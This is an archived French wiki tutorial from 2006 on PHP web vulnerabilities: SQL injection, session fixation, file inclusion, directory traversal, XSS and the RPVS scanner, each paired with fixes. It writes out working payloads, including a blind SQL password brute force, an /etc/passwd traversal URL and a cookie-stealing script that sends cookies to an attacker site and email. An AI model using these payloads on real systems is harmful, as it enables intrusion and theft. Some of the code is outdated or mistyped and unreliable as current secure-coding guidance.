@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="UTF-8" />
+<title>Les injections SQL - Deimos.fr / Bloc Notes Informatique</title>
+<meta name="generator" content="MediaWiki 1.25.5" />
+<link rel="shortcut icon" href="https://wiki.deimos.fr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="opensearch_desc.php" title="Deimos.fr / Bloc Notes Informatique (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="https://wiki.deimos.fr/api.php?action=rsd" />
+<link rel="alternate" hreflang="x-default" href="Les_injections_SQL.html" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr" />
+<link rel="alternate" type="application/atom+xml" title="Deimos.fr / Bloc Notes Informatique Atom feed" href="https://wiki.deimos.fr/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint,shared|mediawiki.sectionAnchor|mediawiki.skinning.interface|mediawiki.ui.button|skins.vector.styles&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*.css" />
+<style>a:lang(ar),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-css:7:6f8c0c45eefd74c7bbe9478b32df38c0 */</style>
+<script src="load.php%3Fdebug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"Les_injections_SQL","wgTitle":"Les injections SQL","wgCurRevisionId":6088,"wgRevisionId":6088,"wgArticleId":2553,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"Les_injections_SQL","wgRelevantArticleId":2553,"wgIsProbablyEditable":false,"wgRestrictionEdit":[],"wgRestrictionMove":[],"wgWikiEditorEnabledModules":{"toolbar":true,"dialogs":true,"hidesig":true,"preview":true,"publish":false}});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function($,jQuery){mw.user.options.set({"variant":"en"});});mw.loader.implement("user.tokens",function($,jQuery){mw.user.tokens.set({"editToken":"+\\","patrolToken":"+\\","watchToken":"+\\"});});
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-js:7:a5c52c063dc436c1ca7c9f456936a5e9 */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","skins.vector.js"]);
+}</script>
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/Vector/csshover.min.htc")}</style><![endif]-->
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-Les_injections_SQL skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+
+						<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">Les injections SQL</span></h1>
+						<div id="bodyContent" class="mw-body-content">
+									<div id="siteSub">From Deimos.fr / Bloc Notes Informatique</div>
+								<div id="contentSub"></div>
+												<div id="jump-to-nav" class="mw-jump">
+					Jump to:					<a href="Les_injections_SQL.html#mw-navigation">navigation</a>, 					<a href="Les_injections_SQL.html#p-search">search</a>
+				</div>
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><div id="toc" class="toc"><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Les_injections_SQL.html#Les_injections_SQL"><span class="tocnumber">1</span> <span class="toctext">Les injections SQL</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Les_injections_SQL.html#La_gestion_des_sessions"><span class="tocnumber">2</span> <span class="toctext">La gestion des sessions</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Les_injections_SQL.html#Les_failles_PHP"><span class="tocnumber">3</span> <span class="toctext">Les failles PHP</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Les_injections_SQL.html#Remote_PHP_Vulnerabilty_Scanner"><span class="tocnumber">4</span> <span class="toctext">Remote PHP Vulnerabilty Scanner</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Les_injections_SQL.html#Astuces"><span class="tocnumber">5</span> <span class="toctext">Astuces</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Les_injections_SQL.html#Ressouces"><span class="tocnumber">6</span> <span class="toctext">Ressouces</span></a></li>
+</ul>
+</div>
+
+<h1><span class="mw-headline" id="Les_injections_SQL"><span class="mw-headline-number">1</span> Les injections SQL</span></h1>
+<p>Les failles de type SQL Injection sont parmi les plus courantes au sein des applications Web. Les sites dynamiques interagissent avec des bases de données qui stockent les informations concernant les utilisateurs. Il est alors possible dans certains cas de manipuler les requêtes vers ces bases afin d'accéder à des informations souvent sensibles.
+</p><p>NDLR&#160;: ce document a été rédigé en 2006, certaines versions ainsi que certaines configurations des logiciels utilisés selon ces versions peuvent être différentes de celles qui sont mentionnées&#160;; merci de vous reporter vers les sites officiels des projets en question en cas de problème. <br /><br /><br />Le langage utilisé pour communiquer entre un script PHP et une base de données, de type MySQL ( lien http externe url:<a rel="nofollow" class="external text" href="http://www-fr.mysql.com/">[click</a>] ) par exemple, est le Structured Query Language aussi connu sous l'acronyme SQL ( lien http externe url:<a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/SQL">[click</a>] ). <br /><br />Pour cela, l’application web doit créer dynamiquement une chaîne de caractères contenant la requête SQL puis l’envoyer vers la base de données. Cette chaîne de caractères peut comprendre des données entrées directement par les utilisateurs du site web. <br /><br />En cas de mauvaise validation de ces données par l'application web, il est possible de détourner l’application de son utilisation initiale en insérant du code SQL au sein de ces entrées utilisateur. <br /><br />Dans l’exemple suivant, un attaquant peut injecter son propre code SQL dans l’une des requêtes effectuées par le script PHP que l'on va étudier ci-dessous. <br /><br />Premièrement, la base de données contient cette table SQL&#160;: <br /><br /><span style="color:#003366">CREATE TABLE site_users( <br />id int, <br />pseudo varchar(32), <br />password varchar(32), <br />email varchar(80), <br />adresse varchar(200) <br />);</span> <br /><br /><br />Le fichier «&#160;email.php&#160;» du site web est un script qui permet d’afficher l’email d’une personne par rapport à son numéro d’identifiant, voici le contenu de ce fichier&#160;: <br /><br /><span style="color:#003366">&lt;? <br />mySQL_connect('127.0.0.1', 'root', <i>); <br />mySQL_select_db('my_database'); <br />$q = mySQL_query("SELECT email,pseudo FROM site_users WHERE id=".$_REQUEST[id]); <br />$r = mySQL_fetch_array($q)&#160;; <br />echo "le mail de ".$r[pseudo];."est&#160;: ".$r[email]; <br />?&gt;</span> <br /><br /><br />Sur le lien «&#160;site.com/email.php?id=45&#160;», le site web affiche le message suivant «&#160;le mail de lambda est exemple@secuobs.com&#160;». Maintenant on essaye une url telle que «&#160;site.com/email.php?id=45%20or%201=1&#160;», le site web affiche alors le message «&#160;le mail de exemple est php@secuobs.com&#160;» <br /><br />Lors de cette dernière requête le script PHP a en fait exécuté le code SQL suivant&#160;: <br /><br /><span style="color:#003366">"SELECT email FROM site_users WHERE id=45 or 1=1".</span> <br /><br /><br />La condition «&#160;1=1&#160;» étant toujours remplie, on a donc eu la possibilité d'injecter du code SQL, «&#160;exemple&#160;» étant un compte de test avec l’id 1 et «&#160;lambda&#160;» un autre compte de test avec l’id 45. <br /><br />Si l’on essaye avec «&#160;id=999999999&#160;» le serveur web affichera alors le message «&#160;le mail de est&#160;» , car il n’existe pas d’utilisateur avec un id équivalent à cette valeur de 99999999. <br /><br />Il va être possible grâce à cette injection SQL de trouver le mot de passe d’un utilisateur donné avec une attaque de type bruteforce ( lien http externe url:<a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/Attaque_par_force_brute">[click</a>] ). <br /><br />A l’aide des opérateurs SQL ‘LIKE’ et ‘%’ , on va faire en sorte que la commande SQL suivante soit exécutée par le serveur web vers la base de données&#160;: <br /><br /><span style="color:#003366">"SELECT email FROM site_users WHERE id=45 AND password LIKE ‘a%’"</span> <br /><br /><br />Ce qui revient en fait à effectuer&#160;: <br /><br /><span style="color:#003366">email.php&#160;?id=45%20AND%20password%20LIKE%20’a%’ </span><br /><br /><br />Cette commande SQL va alors retourner une réponse seulement si le champ id est égal à 45 et si le champ password commence par ‘a’ d’où l’intérêt de l'utilisation du ‘%’. Le mot de passe ne commence pas par ‘a’, le site affiche alors le message «&#160;le mail de est&#160;». <br /><br />On continue en testant plusieurs lettres jusqu'à obtenir un début de réponse de la part du serveur SQL via le serveur web, c'est-à-dire le message «&#160;le mail de lambda est exemple@secuobs.com». <br /><br />Pour connaître la longueur du mot de passe il suffit d'en bruteforcer sa valeur à l’aide de&#160;: <br /><br /><span style="color:#003366">email.php&#160;?id=45%20AND 20LENGHT(password)=5</span> <br /><br /><br />Dans cet exemple, on trouve la valeur 5 comme longueur du mot de passe. <br /><br />On continue l’opération jusqu'à l'obtention du mot de passe de cet utilisateur&#160;: <br /><br /><span style="color:#003366">Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’a%’ <br />Réponse&#160;: «&#160;le mail de est&#160;» <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’b%’ <br />Réponse&#160;: «&#160;le mail de lambda est exemple@secuobs.com&#160;» <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’ba%’ <br />Réponse&#160;: «&#160;le mail de est&#160;» <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’bb%’ <br />Réponse&#160;: «&#160;le mail de est&#160;» <br /><br />…. <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’be%’ <br />Réponse&#160;: «&#160;le mail de lambda est exemple@secuobs.com&#160;» <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’bea%’ <br />Réponse&#160;: «&#160;le mail de lambda est exemple@secuobs.com&#160;» <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’beaa%’ <br /></span><span style="color:#003366">Réponse&#160;: «&#160;le mail de est&#160;» <br /><br />…. <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’beac%’ <br />Réponse&#160;: «&#160;le mail de lambda est exemple@secuobs.com&#160;» <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’beaca%’ <br />Réponse&#160;: «&#160;le mail de est&#160;» <br /><br />… <br /><br />Requête&#160;: email.php&#160;?id=45%20AND%20password%20LIKE%20’beach%’ <br />Réponse&#160;: «&#160;le mail de lambda est exemple@secuobs.com&#160;» <br /></span><br /><br /><br />Le mot de passe de l’utilisateur lambda est donc «&#160;beach&#160;». <br /><br /><br />Pour sécuriser ce script, il aurait suffit de remplacer la requête SQL dans le script PHP par la ligne suivante&#160;: <br /><br /><span style="color:#003366">$q = mySQL_query("SELECT email,pseudo FROM site_users WHERE id=".intval($_REQUEST[id])); </span><br /><br /><br />intval() retourne une valeur décimale entière,. on est alors certain qu’il n’y aura que des chiffres qui seront ajoutés à la requête SQL. Pour sécuriser une chaîne de caractère de ce type, il faut la placer entre ‘ ou " et vérifier que cette chaîne ne contient aucun de ces deux caractères. <br /><br />Il est également possible d'utiliser les fonctions SQL_real_escape_string() et mySQL_escape_string() à cet effet. <br /><br />La première est une fonction de la librairie MySQL et la seconde une fonction propre au langage PHP. Elles sont efficaces seulement si la valeur retournée est encadrée par des guillemets au sein de la requête SQL. <br /><br />La deuxième fonction est cependant maintenant devenue obsolète et il est préférable d’utiliser la première citée. <br /><br />Exemple d’un script sécurisé&#160;: <br /><br /><span style="color:#003366">&lt;&#160;? <br /><br />mySQL_connect('127.0.0.1', 'root', </i>); <br />mySQL_select_db('my_database'); <br /><br />$pseudo = $_REQUEST[pseudo]&#160;; <br />if (get_magic_quotes_gpc()) { <br />$pseudo = stripslashes($pseudo); <br />} <br />$pseudo = mySQL_real_escape_string($pseudo)&#160;; <br />$q = mySQL_query("SELECT email FROM site_users WHERE pseudo=’".$pseudo."’" ); <br />$r = mySQL_fetch_array($q)&#160;; <br />echo "le mail de ".$pseudo."est&#160;: ".$r[email]; <br />?&gt; </span><br /><br /><br />A noter que ces fonctions ne protègent pas contre l'utilisation des caractères&#160;% et _&#160;; ces caractères pouvant être utilisés avec les opérateurs LIKE, GRANT ou REVOKE. <br /><br />La fonction MySQL_real_escape_string() nécessite en fait d’être déjà connecté a la base de données pour être utilisée sinon une valeur booléenne de type FALSE sera renvoyée par ses soins. <br /><br />Dans cette exploitation de l’injection SQL, on considére que les magic quotes ( lien http externe url:<a rel="nofollow" class="external text" href="http://ch2.php.net/magic_quotes">[click</a>] ) sont désactivés dans le fichier de configuration (php.ini) de PHP. <br /><br />Magic quotes est activé par défaut dans les dernières versions de PHP&#160;; cette option transforme les caractères 0x00 par \0 en ascii, ' par ’ et " par \". <br /><br />Il existe cependant de nombreuses techniques et variantes pour l’exploitation d’une injection SQL même avec les magic quotes activés. <br />
+</p>
+<h1><span class="mw-headline" id="La_gestion_des_sessions"><span class="mw-headline-number">2</span> La gestion des sessions</span></h1>
+<p>Les sessions permettent à un site de reconnaître un utilisateur de manière unique à chacune de ses requêtes afin de lui proposer un contenu qui lui soit propre, il est cependant possible pour un attaquant de voler la session d'un utilisateur afin d'en usurper l'identité et d'accéder à ses informations privées.
+</p><p>Un identifiant de session est une valeur généralement égale à 128 bits, cette valeur est représentée en hexadécimal (ex&#160;: 4d7324727be3bd2e9783078e6d0806e7) et elle sert à identifier une personne unique. <br /><br />Elle permettra au site de reconnaître un utilisateur à chacune de ses requêtes afin de lui fournir des actions spécifiques suivant les informations enregistrées dans la base de données (ou pas). <br /><br />L’identifiant de session doit être difficile à prévoir pour un attaquant sinon c'est l'ensemble de la confidentialité du service qui est compromise et donc celle de ses utilisateurs. <br /><br />Pour créer un identifiant de session qui soit sécurisé, il est possible d’utiliser la fonction uniqid() fournie par le langage PHP&#160;: <br /><br /><span style="color:#003366">md5(&#160;uniqid(&#160;rand&#160;(),true&#160;)&#160;);</span> <br /><br /><br />Il est important de créer une session à l’aide de la fonction uniqid(), car la créer uniquement en la générant aléatoirement avec une notion de date et d'heure de création pourrait permettre à un attaquant de retrouver ces informations d'identification de session via les techniques de bruteforce dans certain cas. <br /><br />Un autre type d’attaque sur les sessions existe, elle consiste à faire en sorte que la victime se connecte sur le site avec un identifiant de session que l'on aura défini préalablement&#160;; ainsi si la victime s’identifie ensuite sur le site web avec cet identifiant, on pourra accéder à sa session afin d'usuper son identité et récupérer des informations sensibles sur son compte. <br /><br />Pour cela il suffirait de réaliser un faux site web avec un nom de domaine ressemblant à celui du site ciblé&#160;; sur ce site on pourrait mettre en place une redirection web telle que «&#160;index.php?PHPSESSID=fakesessid&#160;». Le lien ressemblera alors à «&#160;index.php?PHPSESSID=4d7324727be3bd2e9783078e6d0806e7&#160;»&#160;: <br /><br /><span style="color:#003366">&lt;?php <br />header('Location: www.site.com/index.php?PHPSESSID=1234'); <br />?&gt;</span> <br /><br /><br />Il est généralement nécessaire que le cookie de la victime soit également vide ou expiré afin de pouvoir réaliser ce genre d'attaque. Il ne reste donc plus qu’à attendre que la victime s’identifie avec son pseudo et son mot de passe et aller nous aussi sur l'url «&#160;index.php?PHPSESSID=fakesessid&#160;» pour pouvoir accéder à la session de cette victime. <br /><br />Pour sécuriser son script contre ce genre d’attaque il suffit de régénérer un identifiant dès que l’authentification a été réalisée. Le script doit sécuriser les applications web contre les identifiants de session qui n’ont jamais était créés préalablement par le serveur&#160;; s'il n'y avait que la fonction session_start(), le script serait alors vulnérable à ce type d’attaque. <br /><br />Le script sécurisé&#160;: <br /><br /><span style="color:#003366">&lt;?php <br />session_start(); <br /><br />if (!isset($_SESSION['initiated'])) <br />{ <br />session_regenerate_id(); <br />$_SESSION['initiated'] = true; <br />} <br />?&gt; </span><br /><br /><br />Il est par ailleurs possible de régénérer le session identifiée lors de l’authentification pour plus de sécurité, ou même de la régénérer à chaque requête sur le serveur. <br />
+</p>
+<h1><span class="mw-headline" id="Les_failles_PHP"><span class="mw-headline-number">3</span> Les failles PHP</span></h1>
+<p>Les détails des vulnérabilités relatives à l'utilisation des fonctions include() et fopen() dans les scripts PHP ainsi celles associées aux failles de type Cross Site Scripting aussi connues sous l'acronyme XSS. Retrouvez également les principes de sécurisation liés à ces différents types de risques.<br />
+</p><p>La fonction include() <br /><br />Cette fonction est assez connue et utilisée. Elle permet de rendre du code modulaire en chargeant dynamiquement un fichier et en exécutant le code PHP qu'il contient .Elle gère également les fichiers locaux et les streams de type curl , http , ftp et php. <br /><br />Ce qui permet alors d'injecter du code, un exemple avec le fichier «&#160;fichiervuln.php&#160;» se trouvant sur le site vulnérable&#160;: <br /><br /><span style="color:#003366">&lt;? <br />include($_REQUEST["page"]); <br />?&gt;</span> <br /><br /><br />Et un fichier «&#160;hack.txt&#160;» hébergé sur un site quelconque&#160;: <br /><br /><span style="color:#003366">&lt;? <br />phpinfo(); <br />?&gt; </span><br /><br /><br />Sur un site vulnérable on peut remarquer des liens de type «&#160;sitevuln.com/fichiervuln.php?page=contact.html&#160;», pour exploiter la faille en résultant il suffit d'aller simplement sur l'url «&#160;sitevuln.com/fichiervuln.php?page=monserver.com/hack.txt&#160;». <br /><br />On voit alors que la fonction phpinfo() a été exécutée. Un pirate peut alors prendre le contrôle du serveur et exécuter d'autres programmes en passant par les fonction system() ,exec() ou en passant par un exploit local PHP. <br /><br />Pour sécuriser un include() il est nécessaire de valider correctement la variable d'entrée $_REQUEST["page"]&#160;: <br /><br /><span style="color:#003366">&lt;? <br />$inrep = "./"; <br />$extfichier = ".php"; <br />$page = $inrep.basename(strval($_REQUEST["page"]),$extfichier).$extfichier; <br />if(file_exist($page)) <br />include($page); <br />?&gt; </span><br /><br /><br />Par le passé, on a constaté beaucoup d'include sécurisés seulement avec la fonction file_exist() qui renvoie une réponse positive si le fichier existe en local. <br /><br />A partir de la version 5 de PHP, cette fonction gère les streams et notamment les streams http, elle ne protège donc plus de l'injection de code a distance ni de l'injection de code par fichier local. <br /><br />La fonction strval() n'est pas nécessaire sur les versions récentes de PHP. La meilleure façon de sécuriser un code PHP étant encore la suivante&#160;: <br /><br /><span style="color:#003366">&lt;? <br />switch($_REQUEST["page"]) <br />{ <br />case "contact.php": <br />include("contact.php"); <br />break; <br />default: <br />break; <br />} <br />?&gt; </span><br /><br /><br />Cette méthode est beaucoup moins modulaire, mais plus optimisée. <br /><br /><br />La fonction fopen() <br /><br />La fonction fopen() est quant à elle très souvent utilisée et permet d’ouvrir un fichier ou un répertoire pour en afficher le contenu. <br /><br />Généralement les failles liées à cette fonction sont de type «&#160;directory traversal&#160;», c'est-à-dire que l’utilisateur sort de l’arborescence de répertoires qui lui avait été normalement assignée. <br /><br /><span style="color:#003366">&lt;? <br />$filename = $_REQUEST["idimage"]; <br />$filepath = "/rep/secret/".$filename; <br />$filesize = @filesize($filepath); <br /><br />$ext = substr($filename, strrpos($filename, ".") + 1); <br />if ($ext == "jpg") $ext = "jpeg"; <br /><br />if(@file_exists($filepath)){ <br />Header("HTTP/1.1 200 OK"); <br />Header("Content-type: image/" . $ext); <br />Header("Content-Length: $filesize"); <br />Header("Content-Disposition: filename=$filename"); <br /></span><span style="color:#003366">Header("Content-Transfer-Encoding: binary"); <br />Header("Cache-Control: store, cache"); // HTTP/1.1 <br />Header("Pragma: cache"); <br />$fp = fopen($filepath, "rb"); <br />if (!fpassthru($fp)) fclose($fp); <br />} <br />exit; <br />?&gt; </span><br /><br /><br />Ce script permet normalement d'uploader des images. Celles-ci sont stockées dans un répertoire non accessible via le serveur Web (Apache dans ce cas). Il faut donc passer par un script PHP pour voir les photo via une url de type «&#160;site.com/bimage.php?idimage=20050124.jpg&#160;» <br /><br />En fait, ce script permet de lire n'importe quel fichier en local sur le serveur, avec une url comme celle-ci «&#160;site.com/bimage.php?idimage=../../../../../../../../../../../etc/passwd&#160;» <br /><br /><br />On récupère ici le fichier passwd du serveur. A l'aide du très connu "../" on remonte les répertoires, à noter que sur un système d'exploitation de type SUN Solaris la fonction fpassthru() permet de voir également le contenu d'un répertoire. <br /><br />Sur d'autres systèmes d'exploitation, il est nécessaire d'utiliser les fonctions adéquates pour lister les répertoire suite à l'ouverture avec la fonction fopen() . <br /><br />Cette vulnérabilité permet donc de voir le code source d'un fichier .htaccess ou celui d'un .htpasswd mais également les fichier php eux mêmes afin d'en extraire des logins et mots de passe SQL tout en cherchant d'autres failles à exploiter dans ces scripts. <br /><br />Pour valider correctement les variables données en paramètre à un fopen() un filtre est alors nécessaire&#160;: <br /><br /><span style="color:#003366">&lt;? <br />// Filtrer ..\ n'est nécessaire que sur les systèmes d'exploitation de type Windows <br />if(eregi('../',$_REQUEST["idimage"]) || eregi('..\’,$_REQUEST["idimage"])) <br />{ <br />echo "bad input"; <br />exit();// on arrête le script <br />} <br />//sinon on continue <br />$badext = ".php" // on définit les extensions de fichiers à interdire <br />$filename = basename($filename,$badext); // permet de supprimer l'extension .php et de récupérer le nom du fichier sans les répertoires associés <br />$filepath = "/rep/secret/".$filename; <br />// suite normal du script etc etc <br />?&gt;</span> <br /><br /><br />Ne mettez pas une fonction de transcodage après avoir filtré une variable, sinon cela rendra le filtre complètement inutile et il serait alors facilement contournable. <br /><br /><br />XSS&#160;: Cross Site Scripting <br /><br />Le Cross Site Scripting est une attaque coté client, elle s'effectue par injection de code HTML dans le navigateur. Le HTML étant un langage de description par balises il suffit généralement de pouvoir injecter les caractères &lt; et &gt; afin de pouvoir exploiter une vulnérabilité de ce type&#160;: <br /><br /><span style="color:#003366">&lt;&#160;? <br />Echo "bienvenue ".$_REQUEST[nom]&#160;; <br />?&gt; </span><br /><br /><br />C’est le cas classique d’un XSS. Il suffit de visiter l'url «&#160;site.com/vuln.php?nom=&lt;script&gt;alert(1337)&lt;/script&gt;&#160;»&#160;; on peut donc injecter directement du code HTML, javascript et tous les types de code qu'un navigateur est habilité à exécuter. <br /><br />Généralement les magic quote empêche une utilisation du javascript avec ce principe, mais là également on peut facilement le contourner avec une url telle que «&#160;site.com/vuln.php?badvar=%3Cscript%3Ealert%28%22helloworld%22%29%3C/script%3E%3Cnoscript%3E%3Cscript%3E&amp;nom=&lt;script&gt;document.write(unescape(location.href))&lt;/script&gt;&#160;» <br /><br />La variable badvar contient le code javascript qui va afficher le «&#160;helloworld&#160;», on effectue un simple document.write() de l’adresse du site. <br /><br />L’utilisation principale du XSS est le vol de cookie, son fonctionnement est très simple il suffit d’ouvrir une frame ou une fenêtre sur un fichier stockant le cookie passé en paramètre. <br /><br />Le code javascript permettant de voler le cookie serait alors le suivant&#160;: <br /><br /><span style="color:#003366"><br />&lt;script&gt;document.location='www.votresite.com/page.php?cookie=' + document.cookie&lt;/script&gt; <br /></span><br /><br /><br />La page page.php ressemblerait quant à elle à &#160;: <br /><br /><span style="color:#003366">&lt;? <br />$cookie = $_GET['cookie']; <br />mail(“mailduvoleur@hack.com”, “le cookie”, “$cookie”); <br />?&gt; </span><br /><br /><br />Le voleur reçoit donc le cookie par email. Certains cookies contiennent des données sensibles qui peuvent permettre de s’identifier sur un site. <br /><br />Pour se protéger du XSS il suffit de filtrer les variables avant de les afficher sur la sortie, ce filtrage s'effectue à l’aide de la fonction htmlspecialchars() qui va convertir la chaîne en caractères HTML «&#160;affichables&#160;»&#160;: <br /><br /><span style="color:#003366">&lt;&#160;? <br />$out = htmlspecialchars($_REQUEST[nom])&#160;; <br />Echo "bienvenue ".$out; <br />?&gt; </span>
+</p>
+<h1><span class="mw-headline" id="Remote_PHP_Vulnerabilty_Scanner"><span class="mw-headline-number">4</span> Remote PHP Vulnerabilty Scanner</span></h1>
+<p><span style="color:#000000">Remote PHP Vulnerabily Scanner est un outil (parmi d'autres) qui permet de tester la sécurité d'un site web basé sur des scripts PHP. RPVS s’utilise via l'invite de commandes sous Windows.<br /></span>
+<span style="color:#000000">RPVS ( lien http externe url:</span><a rel="nofollow" class="external text" href="http://seclists.org/fulldisclosure/2005/Jan/0552.html">[click</a>]<span style="color:#000000"> ) est en fait un scanner de vulnérabilités PHP a distance de type multithread. Il détecte les failles PHP basiques qui sont les plus recensées sur le web&#160;: <br /><br />- le XSS&#160;: Cross Site Scripting (injection de code HTML dans le navigateur de la victime), <br /><br />- les Erreur SQL (19 erreurs différentes), afin de détecter les injections SQL qui sont réalisables, <br /><br />- les vulnérabilités d'inclusion de fichier avec include() par exemple, <br /></span><span style="color:#000000"><br />- les erreurs de la fonction fopen() ,afin de détecter les fonctions de ce type qui sont mal protégées. <br /><br />- les erreurs de la fonction include() et les insécurités en résultant. <br /><br /><br />L'outil RPVS s'exécute en deux étapes distinctes. <br /><br />Durant la première étape , il va aspirer les pages du site tout en restant dans le domaine et le répertoire de l'adresse passée en argument. <br /><br />Il collecte de multiples informations sur les pages Web dynamiques dont les noms des variables associées aux pages et les valeurs données à chaque variable. <br /><br />Les formulaires et variables associées à ces formulaires sont également récupérés, il arrive que cette première étape soit "sans fin" du fait d’une aspiration dite en boucle. Dans ce cas le bouton "Attack Now" permet d'arrêter la prise d'informations et de passer a l'étape suivante. <br /><br />La seconde étape consiste quant à elle à tester les pages PHP ciblées sur les failles XSS, include(), fopen() et injections SQL avec une même et unique variable. <br /><br />A ce niveau il existe trois mode de scan qui sont représentés par les options -bf ,-f , la troisième et dernière étant celle par défaut. <br /><br />Le scan par défaut va reprendre l'ensemble des URL trouvées directement sur le site ou reconstruites via les formulaires. <br /><br />Pour chaque URL, RPVS teste une a une chaque variable, par exemple "/123456/telechargement.php?outil=nmap.zip&amp;rep=./" va générer deux URL&#160;: "/123456/telechargement.php?outil=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27 &amp;rep=./" et "/123456/telechargement.php?outil=nmap.zip&amp;rep=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27". <br /><br />L’option -f pour "fast mode», va tester en une seule fois toutes les variables d'une page, un exemple avec '/123456/telechargement.php?outil=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27 &amp;rep=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27&amp;list=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27 ". Ce mode est très rapide mais c'est aussi celui qui donne le moins de résultat. <br /><br />L'option -bf permet quant à elle d’essayer toutes les combinaisons possibles d’entrées. Ce scan est très lent mais permet de découvrir des failles que les autres modes ne détectent pas. Il est préférable de l’utiliser en local et avec le mode verbose activé. <br /><br />Exemple&#160;: <br /><br /></span><span style="color:#003366">/123456/index.php3?search=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27 <br />/123456/index.php3?pages=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27 <br />/123456/index.php3?img=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27&amp;page= <br />/123456/index.php3?img=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27&amp;page=membres <br />/123456/index.php3?img=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27&amp;page=forum <br />/123456/index.php3?img=www.google.fr/webhp%3f&lt;balisexss&gt;%22%27&amp;page=gall</span><span style="color:#000000">. <br /><br /><br />L’option -v pour le mode verbose, affiche les adresses web des requêtes HTTP effectuées. <br /><br />L’option -aff pour anti-forum filter, est tout simplement un filtre très utile qui permet d'éviter d'aspirer tous les post d'un forum ou d'un système de news. <br /><br />Elle s'accompagne de l'option -sessid=PHPSESSID pour définir le nom de la variable équivalente à l'identifiant de session, cela permet de ne pas tomber dans une aspiration sans fin. <br /><br /></span><span style="color:#000000">L’option -rapport permet de crée un rapport dans le fichier rapport.txt sous l'arborescence actuelle. <br /><br />Lorsqu'on lance le programme, une fenêtre transparente apparaît avec les information suivantes&#160;: <br /><br />- les indicateurs "nb:" représente le nombre de requêtes HTTP effectuées, <br /><br />- "err fopen" le nombre d'erreurs sur fopen() détecté , <br /><br />- "vuln inc" le nombre de failles d'include , <br /><br />- "err inc" le nombre d'erreurs d'include, <br /><br />- "vuln xss" le nombre de failles de Cross Site Scripting, <br /><br />- "err SQL" le nombre d'erreur SQL, <br /><br />- "url:" la dernière requête en train d'être traitée. <br /><br /><br />A noter que le bouton "Attack Now" passe en "Wait" dès la deuxième étape . </span>
+</p>
+<h1><span class="mw-headline" id="Astuces"><span class="mw-headline-number">5</span> Astuces</span></h1>
